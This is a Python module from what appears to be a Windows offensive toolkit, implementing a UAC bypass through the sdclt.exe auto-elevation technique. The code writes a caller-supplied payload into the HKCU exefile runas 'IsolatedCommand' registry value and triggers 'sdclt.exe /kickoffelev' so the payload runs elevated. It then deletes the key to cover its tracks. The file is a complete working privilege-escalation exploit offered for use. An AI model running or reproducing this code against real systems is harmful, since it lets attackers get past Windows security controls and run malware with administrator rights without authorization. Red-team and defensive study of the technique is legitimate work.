import os
import time
import _winreg
from core.prints import *
from core.utils import *

sdcltisolatedcommand_info = {
        "Description": "Bypass UAC using sdclt (isolatedcommand) and registry key manipulation",
		"Id" : "05",
		"Type" : "UAC bypass",
		"Fixed In" : "17025",
		"Works From" : "10240",
		"Admin" : False,
		"Function Name" : "sdclt_isolatedcommand",
		"Function Payload" : True,
    }

def sdclt_isolatedcommand(payload):
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\exefile\shell\runas\command"))	
		_winreg.SetValueEx(key,"IsolatedCommand",0,_winreg.REG_SZ,payload)
		_winreg.CloseKey(key)
	except Exception as error:
		print_error("Unable to create registry keys, exception was raised: {}".format(error))
		return False
	else:
		print_success("Successfully created IsolatedCommand key containing payload ({})".format(os.path.join(payload)))

	time.sleep(5)

	print_info("Disabling file system redirection")
	with disable_fsr():
		print_success("Successfully disabled file system redirection")
		if (process().create("cmd.exe /c sdclt.exe /kickoffelev",1) == True):
			print_success("Successfully spawned process ({})".format(payload))
		else:
			print_error("Unable to spawn process ({})".format(os.path.join(payload)))

	time.sleep(5)

	try:
		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\exefile\shell\runas\command"))
	except Exception as error:
		print_error("Unable to cleanup")
		return False
	else:
		print_success("Successfully cleaned up, enjoy!")